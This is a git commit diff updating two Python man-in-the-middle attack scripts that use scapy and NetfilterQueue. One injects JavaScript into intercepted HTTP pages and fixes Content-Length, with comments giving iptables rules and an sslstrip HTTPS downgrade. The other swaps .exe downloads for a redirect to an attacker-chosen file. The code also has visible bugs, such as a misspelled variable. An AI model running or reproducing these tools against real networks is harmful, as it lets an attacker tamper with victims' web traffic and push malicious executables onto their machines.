370e55127515de6c92c128a3f9c467bc2a881607
she6ilmsp <she6ilmsp@gmail.com>
2022-05-13 12:53:29 +0530

    modified

--- attacks/code_injector.py
+++ attacks/code_injector.py
@@ -4,34 +4,36 @@ import scapy.all as scapy
 from netfilterqueue import NetfilterQueue
 import re
 
+#if you want to run this attack against https page, then you should downgrade https to http via sslstrip or something
+#so you must change response and request with dport and sport to the program that you running's port
+#you have to set iptable rules instead of FORWARD chain
+#set rules like this:
+#                    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ort 10000
+#                    iptables -I INPUT -j NFQUEUE --queue-num 0
+#                    iptables -I OUTPUT -j NFQUEUE --queue-num 0
+
 def processing_code_injector(packet):
     scapy_packet = scapy.IP(packet.get_payload())
+    load = scapy_packet[scapy.Raw].load.decode('latin1')
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Http Request...")
-            load = re.sub("Accept-Encoding:.*?\\n", "", scapy_packet[scapy.Raw].load.decode())
-            scapy_packet = set_load(scapy_packet, load)
-            packet.set_payload(bytes(scapy_packet))
+            load = re.sub("Accept-Encoding:.*?\\n", "", load)
+            load = laod.replace("HTTP/1.1", "HTTP/1.0")
+
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Http Response...")
-            scapy_load = scapy_packet[scapy.Raw].load.decode('latin1')
-            scapy_load = scapy_load.replace("</body>", script + "</body>")
-            print(scapy_packet.show())
-            scapy_packet = set_load(scapy_packet, scapy_load)
+            load = load.replace("</body>", script + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "text/html" in load:
+                content_length = re.search("(?:Content-Length:\s)(\d*)", load)[1]
+                new_content_length = int(content_length) + len(script)
+                load = load.replace(content_length, str(new_content_length))
+
+        if load != scapy_packet[scapy.Raw].load.decode('latin1'):
+            scapy_packet = set_load(scapy_packet, load)
             packet.set_payload(bytes(scapy_packet))
 
-            if "Content-Length:" in scapy_packet[scapy.Raw].load.decode():
-                content_length = re.search("(?:Content-Length:\s)(\d*)", scapy_packet[scapy.Raw].load.decode())[1]
-                script_len = len(script)
-                new_content_length = int(content_length) + script_len
-                scapy_load = scapy_packet[scapy.Raw].load.decode()
-                scapy_load = scapy_load.replace(content_length, str(new_content_length))
-                scapy_packet = set_load(scapy_packet, scapy_load)
-                packet.set_payload(bytes(scapy_packet))
-                print(scapy_packet.show())
-                print(content_length)
-                print(script_len)
-                print(new_content_length)
     packet.accept()
 
 def set_load(packet, load):
@@ -45,7 +47,7 @@ script = "<script>alert('Poda');</script>"
 
 try:
     queue = NetfilterQueue()
-    queue.bind(1, processing_code_injector)
+    queue.bind(0, processing_code_injector)
     queue.run()
 except KeyboardInterrupt:
     print("Quitting program")
--- attacks/file_interceptor.py
+++ attacks/file_interceptor.py
@@ -5,15 +5,16 @@ from netfilterqueue import NetfilterQueue
 
 def processing_interceptor(packet):
     scapy_packet = scapy.IP(packet.get_payload())
+    load = scapy_packet[scapy.Raw].load.decode('latin1')
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in str(scapy_packet[scapy.Raw].load):
+            if ".exe" in load and replace_file.split('/')[2] not in load:
                 print("[found exe request...]")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: " + replace_file + "\n\n"
+                load = "HTTP/1.1 301 Moved Permanently\nLocation: " + replace_file + "\n\n"
 
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
